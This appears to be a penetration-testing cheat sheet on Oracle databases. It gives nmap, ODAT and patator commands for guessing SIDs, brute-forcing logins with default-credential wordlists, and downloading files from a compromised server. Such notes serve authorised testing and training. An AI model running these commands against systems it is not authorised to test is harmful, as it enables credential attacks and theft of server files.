######
Oracle
######

* https://github.com/quentinhardy/odat/wiki/all

Firstly, follow this guide to get Oracle tools working in Kali: https://github.com/rapid7/metasploit-framework/wiki/How-to-get-Oracle-Support-working-with-Kali-Linux

Bruteforce SIDs
===============

With Nmap:

.. code-block:: none

    nmap -vv -Pn -p <port> -sV --script oracle-sid-brute <target-ip>

With `ODAT <https://github.com/quentinhardy/odat>`__:

.. code-block:: none

    python odat.py sidguesser -s <target-ip> -p <port>

Bruteforce Logins
=================

With `ODAT <https://github.com/quentinhardy/odat>`__:

.. code-block:: none

    python odat.py passwordguesser -s <target-ip> -p <port> -d <sid> --accounts-file accounts/accounts_multiple.txt

With patator:

.. code-block:: none

    patator oracle_login host=<target-ip> port=<port> sid=<sid> user=COMBO00 password=COMBO01 0=/usr/share/seclists/Passwords/Default-Credentials/oracle-betterdefaultpasslist.txt -x ignore:code=ORA-01017 -x ignore:code=ORA-28000

Download Files
==============

With `ODAT <https://github.com/quentinhardy/odat>`__ there are several ways to download a file. Note that "--sysdba" may be optional depending on permissions.

ctxsys
------

.. code-block:: none

    python odat.py ctxsys -s <target-ip> -p <port> -d <sid> -U <userame> -P <password> --sysdba --getFile "/full/path/to/file"

externaltable
-------------

.. code-block:: none

    python odat.py externaltable -s <target-ip> -p <port> -d <sid> -U <userame> -P <password> --sysdba --getFile "/path/to" "file.txt" "local-file.txt"

utlfile
-------

.. code-block:: none

    python odat.py utlfile -s <target-ip> -p <port> -d <sid> -U <userame> -P <password> --sysdba --getFile "/path/to" "file.txt" "local-file.txt"
